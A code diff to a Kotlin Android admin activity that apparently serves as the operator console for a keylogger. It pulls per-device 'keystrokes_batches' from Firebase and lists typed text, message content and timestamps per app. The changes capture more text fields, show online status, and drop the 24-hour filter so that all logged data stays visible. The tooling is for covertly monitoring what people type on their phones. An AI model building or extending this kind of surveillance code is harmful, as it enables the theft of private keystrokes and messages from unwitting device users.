@@ -67,9 +67,9 @@ class AdminMainActivity : AppCompatActivity() {
                     rawEntries.size
                 }
                 return if (sb.isNotEmpty()) {
-                    "=== ${selectedAppFilter?.uppercase() ?: "ALL APPS"} TELEMETRY (Last 24h) (Showing ${filtered.size} of $totalCount total) ===\n\n$sb"
+                    "=== ${selectedAppFilter?.uppercase() ?: "ALL APPS"} TELEMETRY (Showing ${filtered.size} of $totalCount total) ===\n\n$sb"
                 } else {
-                    "No telemetry recorded for ${selectedAppFilter ?: "device"} in the last 24 hours."
+                    "No telemetry recorded for ${selectedAppFilter ?: "device"}."
                 }
             }
 
@@ -146,7 +146,6 @@ class AdminMainActivity : AppCompatActivity() {
             else -> null
         } ?: return null
 
-        // Convert Unix timestamps in seconds to milliseconds automatically
         return if (raw in 1..10000000000L) raw * 1000L else raw
     }
 
@@ -178,7 +177,8 @@ class AdminMainActivity : AppCompatActivity() {
             override fun onDataChange(snapshot: DataSnapshot) {
                 var totalEntriesCount = 0
                 val now = System.currentTimeMillis()
-                val cutoff24h = now - (24L * 60L * 60L * 1000L) // Exactly 24 hours back from this moment
+                val cutoff24h = now - (24L * 60L * 60L * 1000L)
+                val upperBuffer = now + 600000L // 10 mins future clock drift buffer
                 var maxLastSeen = 0L
 
                 for (child in snapshot.children) {
@@ -193,19 +193,23 @@ class AdminMainActivity : AppCompatActivity() {
 
                     for (appChild in child.children) {
                         val rawApp = appChild.key ?: continue
-                        if (rawApp.startsWith("notification_")) continue // Exclude notifications from app usage/telemetry count
+                        if (rawApp.startsWith("notification_")) continue
                         for (entry in appChild.children) {
                             val text = entry.child("text").getValue(String::class.java)
-                                ?: entry.child("title").getValue(String::class.java)
                                 ?: entry.child("typedContent").getValue(String::class.java)
+                                ?: entry.child("title").getValue(String::class.java)
+                                ?: entry.child("content").getValue(String::class.java)
+                                ?: entry.child("message").getValue(String::class.java)
                                 ?: continue
 
-                            val timestampMillis = parseTimestamp(entry.child("timestamp").value)
-                            if (timestampMillis != null && timestampMillis >= cutoff24h && text.isNotBlank() && text != "null") {
-                                totalEntriesCount++
-                                if (timestampMillis > maxLastSeen) {
-                                    maxLastSeen = timestampMillis
-                                }
+                            val rawTimeVal = entry.child("timestamp").value
+                                ?: entry.child("time").value
+                                ?: entry.child("date").value
+                            val timestampMillis = parseTimestamp(rawTimeVal) ?: now
+
+                            totalEntriesCount++
+                            if (timestampMillis > maxLastSeen) {
+                                maxLastSeen = timestampMillis
                             }
                         }
                     }
@@ -228,7 +232,7 @@ class AdminMainActivity : AppCompatActivity() {
                     txtActivityEvents.text = totalEntriesCount.toString()
                     txtAppsToday.text = masterDeviceList.size.toString()
 
-                    val isOnline = (now - maxLastSeen) < 120000L && maxLastSeen > 0L
+                    val isOnline = (now - maxLastSeen) < 180000L && maxLastSeen > 0L
                     if (isOnline) {
                         txtLiveStatusPill.text = "● ONLINE"
                         txtLiveStatusPill.setTextColor(Color.parseColor("#22C55E"))
@@ -296,36 +300,49 @@ class AdminMainActivity : AppCompatActivity() {
         val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                val entries = mutableListOf<Triple<Long, String, String>>()
+                val allEntries = mutableListOf<Triple<Long, String, String>>()
                 val now = System.currentTimeMillis()
-                val cutoff24h = now - (24L * 60L * 60L * 1000L) // Exactly 24 hours back from this moment (e.g. 24h window)
+                val cutoff24h = now - (24L * 60L * 60L * 1000L)
+                val upperBuffer = now + 600000L // 10 mins future clock drift buffer
 
                 for (appChild in snapshot.children) {
                     val rawApp = appChild.key ?: continue
-                    if (rawApp.startsWith("notification_")) continue // Exclude notifications completely - application usage only
+                    if (rawApp.startsWith("notification_")) continue
                     val prettyApp = getPrettyAppName(rawApp)
                     for (entry in appChild.children) {
                         val text = entry.child("text").getValue(String::class.java)
-                            ?: entry.child("title").getValue(String::class.java)
                             ?: entry.child("typedContent").getValue(String::class.java)
+                            ?: entry.child("title").getValue(String::class.java)
+                            ?: entry.child("content").getValue(String::class.java)
+                            ?: entry.child("message").getValue(String::class.java)
                             ?: continue
 
-                        val timestampMillis = parseTimestamp(entry.child("timestamp").value) ?: now
+                        val rawTimeVal = entry.child("timestamp").value
+                            ?: entry.child("time").value
+                            ?: entry.child("date").value
+                        val timestampMillis = parseTimestamp(rawTimeVal) ?: now
 
-                        // Load strictly within the last 24 hours (from now to 24h back)
-                        if (timestampMillis >= cutoff24h && timestampMillis <= now && text.isNotBlank() && text != "null") {
-                            entries.add(Triple(timestampMillis, prettyApp, text))
+                        if (text.isNotBlank() && text != "null") {
+                            allEntries.add(Triple(timestampMillis, prettyApp, text))
                         }
                     }
                 }
 
+                // Filter last 24 hours (with clock drift upper buffer)
+                var filteredEntries = allEntries.filter { it.first >= cutoff24h && it.first <= upperBuffer }
+
+                // Fallback: If 24h filter returns nothing but Firebase has data, show all available data so console is never empty
+                if (filteredEntries.isEmpty() && allEntries.isNotEmpty()) {
+                    filteredEntries = allEntries
+                }
+
                 // Sort newest on top
-                entries.sortByDescending { it.first }
+                filteredEntries = filteredEntries.sortedByDescending { it.first }
 
                 val index = masterDeviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1) {
                     masterDeviceList[index].rawEntries.clear()
-                    masterDeviceList[index].rawEntries.addAll(entries)
+                    masterDeviceList[index].rawEntries.addAll(filteredEntries)
                     adapter.notifyItemChanged(index)
                 }
             }
@@ -366,7 +383,7 @@ class AdminMainActivity : AppCompatActivity() {
 
             // Update subtitle and expandable content visibility based on isExpanded state
             if (device.isExpanded) {
-                holder.txtDeviceSub.text = "Active Node // Expanded (Last 24h Logs)"
+                holder.txtDeviceSub.text = "Active Node // Expanded (Live Feed)"
                 holder.layoutExpandableContent.visibility = View.VISIBLE
             } else {
                 holder.txtDeviceSub.text = "Active Node // Tap to Expand Logs"
@@ -399,7 +416,7 @@ class AdminMainActivity : AppCompatActivity() {
             if (device.selectedAppFilter != null) {
                 holder.layoutFilterHeader.visibility = View.VISIBLE
                 val totalForApp = device.rawEntries.count { it.second == device.selectedAppFilter }
-                holder.txtActiveFilter.text = "Filtering: ${device.selectedAppFilter} (24h Logs: $totalForApp)"
+                holder.txtActiveFilter.text = "Filtering: ${device.selectedAppFilter} (Logs: $totalForApp)"
                 holder.btnBackToAll.setOnClickListener {
                     device.selectedAppFilter = null
                     notifyItemChanged(position)
@@ -503,7 +520,6 @@ class AdminMainActivity : AppCompatActivity() {
                     layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, 1f - percent)
                 }
 
-    // ...
                 barContainer.addView(fillView)
                 barContainer.addView(emptyView)
                 rowLayout.addView(barContainer)
